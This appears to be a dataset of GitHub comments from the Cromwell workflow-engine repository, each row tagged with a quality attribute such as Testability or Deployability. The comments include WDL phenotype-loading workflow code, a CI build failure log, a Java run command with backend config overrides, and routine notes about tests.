https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:7128,Deployability,continuous,continuous,7128,"sample_list.data,; sex_mismatch_sample_list = sex_mismatch_sample_list.data,; low_genotyping_quality_sample_list = low_genotyping_quality_sample_list.data; }; }. call tasks.load_shared_covars { input:; script_dir = script_dir,; fam_file = fam_file,; sc_pcs = sc_pcs,; sc_assessment_ages = sc_assessment_ages; }. if (!is_binary) {; call tasks.load_continuous_phenotype { input :; script_dir = script_dir,; sc = sc_phenotype,; qced_sample_list = all_qced_sample_lists.data[0],; assessment_ages_npy = load_shared_covars.assessment_ages,; categorical_covariate_names = categorical_covariate_names,; categorical_covariate_scs = categorical_covariate_scs; }; }; if (is_binary) {; call tasks.load_binary_phenotype { input:; script_dir = script_dir,; sc = sc_phenotype,; qced_sample_list = all_qced_sample_lists.data[0],; sc_year_of_birth = sc_year_of_birth,; sc_month_of_birth = sc_month_of_birth,; sc_date_of_death = sc_date_of_death,; date_of_most_recent_first_occurrence_update = date_of_most_recent_first_occurrence_update,; is_zero_one_neg_nan = is_zero_one_neg_nan; }; }; # regardless of continuous or binary, get the outputs and move on; File pheno_data = select_first([load_continuous_phenotype.data, load_binary_phenotype.data]); File covar_names = select_first([load_continuous_phenotype.covar_names, load_binary_phenotype.covar_names]); File pheno_readme = select_first([load_continuous_phenotype.README, load_binary_phenotype.covar_names]). output {; Array[File] out_sample_lists = all_qced_sample_lists.data; File assessment_ages = load_shared_covars.assessment_ages; File shared_covars = load_shared_covars.shared_covars; File shared_covar_names = load_shared_covars.covar_names; File pheno_data_out = pheno_data; File covar_names_out = covar_names; File pheno_readme_out = pheno_readme; }; }; ```. tasks.wdl; ```; version 1.0. # any input file with a default relative to the script_dir; # needs to be supplied by the user, it won't be the product of another task; # if input files to tasks ca",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269
https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:8747,Performance,Load,Loading,8747,"; File covar_names_out = covar_names; File pheno_readme_out = pheno_readme; }; }; ```. tasks.wdl; ```; version 1.0. # any input file with a default relative to the script_dir; # needs to be supplied by the user, it won't be the product of another task; # if input files to tasks can be supplied by another tasks output, ; # there will be a comment specifying; # task input files without comments need to be supplied by the user; # see the expanse workflow for where those are on expanse; # exception: sc (data showcase) tasks are labeled by data field id; # but do need to be supplied by the user. # output files from tasks will be commented with the location; # they reside on expanse; # this isn't necessary for understanding/running the WDL, just useful notes for myself; # for transitioning from snakemake to WDL. # sample_list file format; # first line is 'ID' (case insensitive); # every successive line is a sample ID. # TODO: set container for each task. ####################### Loading samples and phenotypes ####################. task write_sample_list {; input {; String script_dir; File script = ""~{script_dir}/sample_qc/scripts/write_sample_list.py"". File sc; Int? value; }. output {; File data = ""data.out""; }. command <<<; ~{script} ~{sc} data.out ~{""--value "" + value}; >>>. runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task ethnic_sample_lists {; input {; String script_dir; File script = ""~{script_dir}/sample_qc/scripts/ethnicity.py""; File python_array_utils = ""~{script_dir}/sample_qc/scripts/python_array_utils.py"". File white_brits_sample_list # write_sample_list 22006; File sc_ethnicity_self_report # 21000; } . output {; # sample_qc/common_filters/ethnicity/{ethnicity}.sample; Array[String] ethnicities = [; ""black"",; ""south_asian"",; ""chinese"",; ""irish"",; ""white_other"",; ]; # These can be zipped together to form a map if desired; Array[File] sample_lists = [; ""black.sample"",; ""south_asian.sample"",; ""chinese.sample"",; ""irish.sample"",; ""white_other.sample"",; ]; }. c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269
https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:11937,Performance,load,load,11937,"~{unqced_sample_list} \; ~{withdrawn_sample_list} \; ~{sex_mismatch_sample_list} \; ~{sex_aneuploidy_sample_list} \; ~{low_genotyping_quality_sample_list} \; ~{""--subpop "" + subpop_sample_list}; >>> . runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task load_shared_covars {; input {; String script_dir; File script = ""~{script_dir}/traits/load_shared_covars.py"". File fam_file; File sc_pcs # 22009; File sc_assessment_ages; }. output {; # all in traits/shared_covars/; File shared_covars = ""shared_covars.npy"" ; File covar_names = ""covar_names.txt""; File assessment_ages = ""assessment_ages.npy""; }. command <<<; ~{script} . ~{fam_file} ~{sc_pcs} ~{sc_assessment_ages}; >>>. runtime {; memory: ""10g"". dx_timeout: ""15m""; }; }. task load_continuous_phenotype {; input {; String script_dir; File script = ""~{script_dir}/traits/load_continuous_phenotype_from_main_dataset.py"". File sc; File qced_sample_list # from qced_sample_list. File assessment_ages_npy # from load shared covars; Array[String] categorical_covariate_names; Array[File] categorical_covariate_scs; }. output {; File data = ""pheno.npy""; File covar_names = ""pheno_covar_names.txt""; File README = ""pheno_README.txt""; }. command <<<; ~{script} \; ~{sc} \; '.' \; ~{qced_sample_list} \; ~{assessment_ages_npy} \; --categorical-covariate-names ~{sep="" "" categorical_covariate_names} \; --categorical-covariate-files ~{sep="" "" categorical_covariate_scs}; >>>. runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task load_binary_phenotype {; input {; String script_dir; File script = ""~{script_dir}/traits/load_binary_phenotype_from_main_dataset.py"". File sc; File qced_sample_list # from qced_sample_list. File sc_year_of_birth # 34; File sc_month_of_birth # 52; File sc_date_of_death # 40000; String date_of_most_recent_first_occurrence_update; Boolean is_zero_one_neg_nan = false; }. output {; File data = ""pheno.npy""; File covar_names = ""pheno_covar_names.txt""; File README = ""pheno_README.txt""; }. command <<<; ~{script} \; ~{sc} \; '",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269
https://github.com/broadinstitute/cromwell/issues/6973#issuecomment-1367087595:69,Deployability,release,releases,69,CWL support [was removed](https://github.com/broadinstitute/cromwell/releases/tag/79). References to it in code and documentation are being cleaned up as opportunity arises.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6973#issuecomment-1367087595
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1374208928:10,Testability,log,logo,10,![nirvana-logo](https://user-images.githubusercontent.com/961771/211111004-278e4d49-b736-4a16-a945-fcf715eb76ca.jpeg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1374208928
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:486,Availability,Error,Error,486,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:528,Availability,Error,Error,528,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:637,Availability,Error,Errors,637,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:70,Integrability,message,messages,70,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:521,Testability,log,login,521,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:619,Testability,log,login,619,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:691,Testability,test,test,691,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382193325:0,Testability,Test,Tests,0,Tests should be good now!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382193325
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382246399:14,Testability,test,tests,14,"Thanks Janet, tests are passing here! 🎉 I wish I could say the same for the tests in `firecloud-develop`, I think those are just being flakey but very persistently so...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382246399
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382246399:76,Testability,test,tests,76,"Thanks Janet, tests are passing here! 🎉 I wish I could say the same for the tests in `firecloud-develop`, I think those are just being flakey but very persistently so...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382246399
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:347,Deployability,update,update,347,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:173,Modifiability,config,config,173,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:15,Testability,test,tests,15,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:34,Testability,test,tests,34,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:88,Testability,test,tests,88,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:97,Testability,test,test,97,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:163,Testability,test,testing,163,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931
https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1387372574:186,Availability,avail,available,186,Thank you for the thumbs! A friendly reminder that the related https://github.com/broadinstitute/firecloud-develop/pull/3194 needs similar thumbing to actually make this reference image available in Terra.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1387372574
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:663,Availability,error,error,663,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:175,Modifiability,config,config,175,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:360,Modifiability,config,config,360,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:434,Modifiability,config,config,434,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:263,Security,secur,security,263,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:756,Testability,test,test-files,756,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:830,Testability,test,test-files,830,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1413802403:39,Security,access,access,39,"@jgainerdewar Since I don't have write access to this PR, here are my changes: https://github.com/broadinstitute/cromwell/pull/6997",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1413802403
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:105,Availability,error,error,105,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:146,Availability,error,error,146,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:367,Availability,failure,failures,367,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:21,Deployability,update,updates,21,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:256,Security,access,access,256,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:141,Testability,test,test,141,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:362,Testability,test,test,362,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1419112237:117,Testability,test,tests,117,"@BMurri Thank you! Yeah, we're having CI problems right now that are unrelated to these changes, I'll shepherd these tests through once those are resolved.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1419112237
https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1421515918:0,Testability,Test,Tests,0,Tests should be fixed now 🤞,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1421515918
